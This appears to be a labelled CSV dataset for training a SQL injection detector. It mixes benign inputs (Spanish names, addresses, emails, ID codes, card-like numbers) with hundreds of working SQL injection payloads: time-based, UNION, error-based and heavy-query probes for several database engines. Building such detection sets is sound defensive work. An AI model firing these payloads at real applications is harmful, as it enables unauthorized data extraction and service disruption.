Query,Label
10263,0
wilfredo,0
00712854s,0
rabulas,0
carraleja,0
1) or (select * from (select(sleep(5)))ydpu),1
1') and sleep(5) and ('njud'='njud,1
barby,0
"robert graves, 101",0
muenster@introito.th,0
carrer de merida 35 8-c,0
pafilis,0
"1""))) and 7533=7533 and (((""xopd""=""xopd",1
completorio,0
smelters,0
frank@soymuyguapa.tn,0
29640,0
-1700%' or 4149=3391#,1
kaluzny3,0
12185,0
"1'+(select sfuq where 8094=8094 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1))+'",1
6608r.lo2uo,0
gianella,0
1'))) and 5615=5458--,1
binder gene,0
obn,0
navalmoral de bjar,0
"-5998%"") union all select 2366,2366,2366,2366#",1
garantir,0
"c/ historiador manuel salcines 133, 6b",0
"1""));begin user_lock.sleep(5); end and ((""cxoi""=""cxoi",1
"1%')) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (('%'='",1
"calle costa brava, 148,",0
1'));select (case when (3365=6236) then 3365 else 1/(select 0) end)--,1
coppin@sexl.no,0
2ariosamente,0
viola5,0
7791374198907519,0
-8615))) or 4039=9144,1
jaswal,0
-6377' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'qcms' like 'qcms,1
"1"")) as uzvu where 2458=2458 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
1'+(select echl where 6593=6593 rlike (select * from (select(sleep(5)))vwyq)#,1
-7663')) or 1558=1104 and (('wsrq'='wsrq,1
5764,0
fulgencia,0
"1') union all select null,null,null,null#",1
ardevol herrador,0
caadillas almendro,0
sensiblemente,0
"calle pea 49, 9?b",0
-8032%'))) or 9323=9323#,1
1%')) and 3721=2597#,1
"-3781) union all select 3916,3916,3916--",1
42210,0
pavan@phd-photodecor.in,0
"1' where 8749=8749 or 8421=(select count(*) from generate_series(1,5000000))--",1
1 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')# twev,1
"-9845"") as xpis where 1936=1936 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
divinizacin,0
pl. herrera de los navarros 68 12-h,0
38728859x,0
08502321a,0
06227,0
47260,0
6775762435738331,0
"-7941%') union all select 6965,6965,6965,6965--",1
"1,(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4250=4250) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",1
48573885r,0
"1%' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and '%'='",1
-7164%' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and '%'=',1
montiel@sitienesunawebtienesunnegocio.cf,0
caterina,0
17590r,0
san vicente del raspeig/sant vicent del raspeig,0
gillespie@deuxmanagement.web,0
devy,0
fonz,0
"1%"") and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",1
"1')) and make_set(8245=9872,9872) and (('kzgt'='kzgt",1
"1%"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""%""=""",1
fredman6@cor-jet.to,0
scotty,0
f6lo40r06,0
lareo robles,0
83217349z,0
1')) as joco where 2922=2922;select sleep(5)--,1
"-2116%'))) union all select 7119,7119,7119,7119,7119--",1
4364,0
"1 where 6881=6881 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",1
3829,0
4248,0
ladi,0
"1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and 'tuzl'='tuzl",1
75512816k,0
tati@callalabocaatiaherminia.travel,0
"1%"");waitfor delay '0:0:5' and (""%""=""",1
39499084b,0
4126502266405093,0
"-9558"" where 7497=7497 or (2539=6484)*6484--",1
"calle del llenguadoc s/n, 6e",0
1' where 6116=6116;select (case when (7033=1594) then 7033 else 7033*(select 7033 from information_schema.character_sets) end)#,1
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'mvkg'='mvkg",1
26288,0
t5m3la,0
"-4811%')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('%'='",1
-8397'))) or 2171=4788,1
bordin,0
lehrer@didacramirez.sb,0
mundy,0
"1""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""buwe""=""buwe",1
1563947873431208,0
7aria22,0
c/ guadiana 80 13-a,0
"1'));select count(*) from generate_series(1,5000000) and (('jloi'='jloi",1
1%')) and 9198=9198--,1
patchsqa,0
1') rlike sleep(5) and ('qsub' like 'qsub,1
"-5218) union all select 9677,9677#",1
fowler,0
aguaviento,0
suzan,0
barrenechea sadurn,0
peluffo1@psicoencuentronline.va,0
"calle miramar, 169,",0
balaguer,0
crip3gama,0
"glorieta antonio molina 87,",0
"-1236'+(select 'fbgh' where 3896=3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",1
kirbee,0
"1') as viex where 6242=6242 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",1
villalba de los barros,0
21?i05r2,0
-7369 or 9323=9323#,1
27643638f,0
57417611c,0
1)) as uvep where 6016=6016 and 6969=(select 6969 from pg_sleep(5))--,1
"calle las artes, 90,",0
vasil9,0
4336085166451274,0
"-3562"") as eghl where 7094=7094 union all select 7094,7094,7094,7094#",1
"1'+(select vxax where 9036=9036 and elt(1210=1210,sleep(5)))+'",1
1%') or sleep(5) and ('%'=',1
taravilla,0
p5li8e5i2,0
"calle pintor juan ismael, 73,",0
"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",1
08zaril0o,0
martinho burgs,0
"1%"";select (case when (7005=7118) then 1 else 7005*(select 7005 from master..sysdatabases) end)--",1
cuevas de san marcos,0
"1"") where 2070=2070;iif(5257=5257,1,1/0)",1
gattas,0
herminia,0
73732702s,0
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),1
1';waitfor delay '0:0:5' and 'gsvt'='gsvt,1
7ri87at0,0
"1 where 4331=4331 union all select null,null,null,null,null,null#",1
"1'+(select nvht where 9118=9118 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'",1
"1"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""hjxh""=""hjxh",1
"-9456%"")) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((""%""=""",1
9u5es2v83ent2,0
-2992')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('tjgt'='tjgt,1
chaila,0
rory,0
8a86ra7,0
29385081m,0
"-6377'||(select 'ryin' where 2113=2113 union all select 2113,2113,2113#",1
sayers,0
"-1422%"") or make_set(9539=9519,9519) and (""%""=""",1
plaa del pi 126 11?g,0
06378,0
"1%')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('%'='",1
1') rlike (select * from (select(sleep(5)))sgvo) and ('zqiw'='zqiw,1
-5286' or 6783=1233,1
8400392219443841,0
1) where 9446=9446 union all select null#,1
cigales,0
"1""))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""xnsj"" like ""xnsj",1
kilian,0
-2745)) as aywp where 9735=9735 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,1
"-5391 or make_set(9354=9354,7185)# ptyy",1
dalt,0
atuesta venturi,0
"1"")));select (case when (9434=2780) then 9434 else 9434*(select 9434 from information_schema.character_sets) end)#",1
5975278199435199,0
"c/ arquitecto hernandez rubio, 101, 1h",0
santa eulalia de gllego,0
"1);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",1
bols,0
"-4972')) as kfzc where 8817=8817 union all select 8817,8817,8817,8817,8817,8817--",1
ondara,0
01213,0
"1""))) union all select null,null,null,null,null,null,null,null,null,null#",1
"1%"") union all select null,null,null,null,null,null,null,null--",1
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1
"c/ la miraculosa, 147",0
"calle rio piguea, 5,",0
1) as lvfu where 5831=5831 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1
beaumont@lasmilyuna.gi,0
fitness,0
"-7568""))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""jxge"" like ""jxge",1
mel,0
caiza,0
1)));select case when 7717=7717 then 1 else null end--,1
"1);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",1
"abubilla, 125 12h",0
de8atem762rse,0
chen@testevelocidad.nl,0
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('wusq'='wusq",1
calle federico mompou 144 11-d,0
"1""))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((""hiwo"" like ""hiwo",1
"-9808' in boolean mode) union all select 2528,2528,2528,2528,2528,2528,2528--",1
abagael,0
"zaida, la",0
2226226735734653,0
"1"" where 9014=9014 and 6969=(select 6969 from pg_sleep(5))--",1
"1%"");select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""%""=""",1
"1"" where 7788=7788 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
morande,0
adolphe,0
sabourin,0
casarejos,0
"umbria, 143,",0
retos9a1o,0
0902736891037031,0
marcum3,0
marracos,0
"1 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)# cgow",1
ablitas vilaregut,0
"1',(select (case when (5777=5777) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",1
"1')) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"1')) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"calle montesol 30,",0
96312323f,0
"espluga calba, l'",0
15686,0
bruscamente,0
0512154682216503,0
colmada,0
4780723426433072,0
roberto,0
net.valdez@salaparis.gt,0
43896,0
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'hstg' like 'hstg",1
yadhira,0
"1' union all select null,null--",1
48707568p,0
en8relan3amien0o,0
macduff,0
"calle andres mellado, 83, 12-d",0
rob,0
"1%')) union all select null,null,null#",1
don juan 126,0
"1"" or 6793=(select 6793 from pg_sleep(5)) and ""pwwb"" like ""pwwb",1
olascoaga huix,0
boixad delacerda,0
"-5320 where 8051=8051 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"1') as sjmt where 6541=6541 or 8421=(select count(*) from generate_series(1,5000000))--",1
20s6a8or,0
imaz.leftwich@culturalsanpedrocf.no,0
"calle mercurio, 19,",0
"1 or 8466=benchmark(5000000,md5(0x694a4745))",1
28811,0
"1%') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('%'='",1
"-2333' union all select 9714,9714,9714--",1
navas de san juan,0
"1'||(select 'gtri' from dual where 7097=7097 and elt(1210=1210,sleep(5)))||'",1
7370150636603952,0
bohyun,0
1%')) and 4595=4595#,1
1));waitfor delay '0:0:5' and ((7619=7619,1
natsume-dodsworth@obelix.km,0
"1' and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"albadalejo hijuela 76,",0
"1;select count(*) from generate_series(1,5000000)--",1
22320,0
"carrer felix cucurull, 167 3-a",0
12785855v,0
"1'+(select mkbv where 1648=1648 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"-6775"" union all select 7484,7484#",1
bienia,0
salma,0
15896821a,0
paleogrfico,0
13420,0
"1,(select 9100=('qqpjq'||(select case 9100 when 9100 then 1 else 0 end from rdb$database)||'qzvzq'))",1
"1' where 8083=8083 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",1
"-4541"")) or make_set(4821=5233,5233) and ((""xfex""=""xfex",1
ramss,0
-6661')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('tbmu' like 'tbmu,1
"1%"") or sleep(5) and (""%""=""",1
"1'||(select 'lxpg' where 7390=7390 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",1
ru5runears2,0
0598963816827000,0
"c/ estornino s/n, 9f",0
34338,0
"1' in boolean mode) union all select null,null,null#",1
"1"" and 9468=7105--",1
hdbright6,0
8217,0
"1') as uytv where 7875=7875 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
46940,0
49327,0
67094993z,0
95690740e,0
envaronar,0
pr3caz,0
17861,0
"-3347'+(select xuzs where 1076=1076 union all select 1076,1076,1076,1076,1076--",1
"-2701"")) as wvht where 5401=5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",1
tauja,0
-7940') union all select 6024--,1
3349,0
48,0
"eliana, l'",0
eva,0
"1%""))) and 2388=benchmark(5000000,md5(0x6d457153))#",1
65781436x,0
1%'));(select * from (select(sleep(5)))acdk)#,1
1) as afmb where 8665=8665 order by 1#,1
3792182208428268,0
07789163y,0
"1'||(select 'ymwf' where 1229=1229 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))||'",1
chisvert,0
8328,0
2800093230018510,0
f536e6a,0
09737,0
1) rlike sleep(5) and (5724=5724,1
equ1tacin,0
3261409543523754,0
"-6639') as trll where 6271=6271 union all select 6271,6271,6271#",1
"1'+(select 'ejox' where 2719=2719 union all select null,null,null#",1
"1 and make_set(6911=1867,1867)",1
67312081m,0
wilmer@dubi.as,0
cimorra,0
2793,0
-8357')) as henk where 8198=8198 or 2558=9103#,1
zapasiewicz@pinkplanetplasencia.bn,0
derwin,0
andrease,0
0367766571989021,0
-5031' or 9323=9323#,1
7966926695826035,0
"-9772' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'igaa'='igaa",1
1;select case when 7717=7717 then 1 else null end--,1
trixie,0
c4nt0rn,0
"1%"")) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
"1' or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
777t1c4rio,0
"1%';select * from generate_series(9863,9863,case when (9863=3285) then 1 else 0 end) limit 1--",1
gdowik2,0
larguey@erasmusrooms.qa,0
hana,0
t16564l,0
hargreav,0
47315,0
"1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1
"calle capita farre, 82, 8-d",0
"1'+(select 'vbqo' where 5630=5630 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
"-7746') union all select 1998,1998,1998,1998,1998,1998,1998,1998#",1
"1"") as cxwd where 5800=5800 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
08394,0
"-8790') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('nsze' like 'nsze",1
inch.livermore@zing.es,0
9708629316850824,0
"1"") as fcrx where 2929=2929 and 2820=5133",1
"1"") and 8635=(select count(*) from generate_series(1,5000000))--",1
c/ los castaos 10,0
38726,0
rull,0
1%')));begin dbms_lock.sleep(5); end--,1
lana,0
"1"") as buky where 7898=7898 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
roncar,0
8496429893525706,0
10328,0
fornals campbell,0
arrafiz,0
hayman,0
"-1808%"")) or 4595=3545 and ((""%""=""",1
50293,0
tricentenario,0
villahermosa del ro,0
26033,0
"1%'))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
"c/ pintor gomez cano 9, 10?e",0
"1%""));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((""%""=""",1
belalczar,0
1') as njfg where 6392=6392 waitfor delay '0:0:5'--,1
1' in boolean mode);select sleep(5)#,1
5044889825905516,0
"1')) and make_set(8403=8403,8899) and (('bmsa'='bmsa",1
"-5187"") union all select 3373,3373#",1
shumsky.zalata5@telelujo.ci,0
"1) as svkf where 6503=6503 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
antone1@tiendasyofertas.ve,0
28991243l,0
"-8791""))) or make_set(6681=6620,6620) and (((""pvdk""=""pvdk",1
1)) as eveb where 7567=7567;if(5316=4416) select 5316 else drop function vtve--,1
"sugranyes, 166,",0
93310194e,0
16452,0
gladiolos 30,0
1022652655889356,0
sowry,0
"1%"") and 8594=(select 8594 from pg_sleep(5))--",1
cerinza,0
"1""))) and (3020=3020)*6703 and (((""fqap"" like ""fqap",1
re413t8208o,0
cambre@beesmer.na,0
diago dardn,0
"calle benito monfort 60,",0
"1' where 1893=1893 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
rad0oelctrico,0
"1) as tgqd where 6369=6369 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"1%""));if(7899=7899) select 7899 else drop function zbbp--",1
2759,0
gula,0
1')) waitfor delay '0:0:5' and (('jcfe'='jcfe,1
salerno.harmer@nexuspark.li,0
despault2,0
75169095n,0
camisoln,0
"1%""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""%""=""",1
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",1
freiss@turinga.tn,0
339403r90am958e,0
"1%'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('%'='",1
denotativo,0
"1')) as ovbz where 3203=3203 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",1
s0308ga52r,0
"1%'))) union all select null,null,null,null,null,null,null--",1
"1%') and 3824=benchmark(5000000,md5(0x76555642)) and ('%'='",1
1'+(select 'rkap' where 9692=9692;waitfor delay '0:0:5')+',1
ardis,0
buhr_hubschmidt@hiteurope.al,0
1'+(select qugu where 2287=2287 order by 1#,1
"1'))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('yiem'='yiem",1
1)) and 2886=1133--,1
22535,0
girona,0
"1') as idqc where 5288=5288 and elt(1210=1210,sleep(5))--",1
"-1907"")) or 2782=3591",1
estrada perdig,0
"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",1
puebla de albortn,0
22232,0
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))",1
"1""))) and 6969=(select 6969 from pg_sleep(5)) and (((""ipqw"" like ""ipqw",1
"1"";select (case when (1354=7529) then 1354 else cast(1 as int)/(select 0 from dual) end) from dual--",1
raddie,0
gerald@magritte.bs,0
-5585' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),1
estanislao,0
alcalde gregorio espino 165,0
46369,0
"1') as pghp where 9086=9086;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
23il04,0
"1%"") or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (""%""=""",1
isla de cuba 85 3-b,0
verani@viajesdacapalla.gq,0
1%'));select (case when (7594=8086) then 7594 else 1/(select 0) end)--,1
"1"")) union all select null--",1
metcalfe,0
42301351g,0
8889874100386477,0
2293,0
34597096j,0
09227,0
"-8490)) union all select 6910,6910,6910,6910,6910,6910#",1
diego medina 82 5-b,0
1' rlike sleep(5) and 'ojqz' like 'ojqz,1
opsito,0
9598787825284298,0
dejillo,0
greenlee,0
pelez bastus,0
2061277853418882,0
eddisfor4,0
"1"") and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""otgh"" like ""otgh",1
7178886603205513,0
seaman@salaparis.ws,0
"1"")) or elt(6272=6272,sleep(5)) and ((""chvi"" like ""chvi",1
yong-gomori@andrestabernero.gg,0
abordonar,0
"1%"") union all select null,null,null,null,null,null,null#",1
-6566') as kggb where 9768=9768 order by 1--,1
2308021987140157,0
"salvador perles, 23,",0
"plaza de la constitucion 40, 5e",0
grandura,0
scala@novisa.ch,0
deg0a7a0,0
"1))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((9802=9802",1
somisett,0
le8ru41,0
rube,0
7ob0edo,0
"1) where 2473=2473 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",1
rigente,0
"masia can sang, 33",0
0052422482512057,0
watts@viajesnacionales.na,0
"1)) as pxmz where 2596=2596;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
1'+(select 'ueak' where 7329=7329 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))+',1
"pl. juan de antxieta, 191, 13?g",0
34192,0
"1') as yuqv where 6007=6007 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",1
mandel_lanctot@elrincondelmarmol.bu,0
1')) as azsd where 3870=3870 waitfor delay '0:0:5'--,1
parnell,0
decuir,0
"1 union all select null,null,null,null#",1
3772,0
1 where 9932=9932;select sleep(5)--,1
qunola,0
abbot,0
milara kirkpatrick,0
1') as mqxb where 6496=6496 and 7533=7533--,1
"-9837"" where 7201=7201 union all select 7201,7201,7201--",1
auyeung,0
"-2912"") as eizh where 2223=2223 or make_set(1041=3056,3056)--",1
"1%'))) union all select null,null,null--",1
4960204900106795,0
"-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",1
1') as gsjr where 7046=7046 and sleep(5)#,1
h?ele77,0
"1"")) as dvpb where 6673=6673;select * from generate_series(6730,6730,case when (6730=9431) then 1 else 0 end) limit 1--",1
c/ santo domingo 13 10?b,0
caizares,0
muth,0
4302979715945309,0
"1')) as crzr where 5373=5373 and elt(3114=3114,sleep(5))#",1
"1"") as ucex where 5148=5148 order by 1#",1
esclisiado,0
contraveros,0
1%') and 9198=9198--,1
"calle aguamarina, 193 10-d",0
"1)) union all select null,null#",1
vilamasa pacheca,0
50549,0
balzo@onlinegratis.lv,0
melero benaducci,0
4a9a8g8,0
"1"" where 5062=5062;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
2962225495583197,0
1'+(select 'iyyv' where 9500=9500 or (select * from (select(sleep(5)))ydpu))+',1
chihung,0
dikaitis5,0
"1%')));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
"viso de san juan, el",0
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('mmvf' like 'mmvf",1
farese@bloodline.as,0
1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('czqk' like 'czqk,1
48508,0
"1) as ekgx where 9923=9923 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"calle lirios, 51, 3?a",0
42342,0
gasser ortega,0
"1"")) as qgwq where 6122=6122;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
4073783110590723,0
alienacin,0
80,0
colliti.shale@ropadegolf.com.dd,0
"1%"")) and elt(1210=1210,sleep(5)) and ((""%""=""",1
"-9227) where 6723=6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--",1
"1) union all select null,null,null,null,null,null,null,null,null,null#",1
"carril lloret, 52",0
90r2l,0
"-8794))) union all select 5802,5802,5802--",1
7x,0
"1')) as cbka where 3176=3176 and 8407=(select count(*) from generate_series(1,5000000))--",1
1));select sleep(5)#,1
1' and 7528=2894 and 'qoyw'='qoyw,1
17300,0
"1') and make_set(7187=4625,4625) and ('diai' like 'diai",1
sensualmente,0
mcmurray,0
"1%"")) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
crislogo,0
4422133656850108,0
81621470j,0
1%'))) or 4240=(select 4240 from pg_sleep(5))--,1
"1') and make_set(4551=6487,6487) and ('jnqa'='jnqa",1
"1' in boolean mode) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)#",1
enri,0
rodionova@movil-google.ga,0
padmanab,0
3154021344584169,0
4e6qu5r5r,0
"1%' and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"1"")) as paep where 8947=8947 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
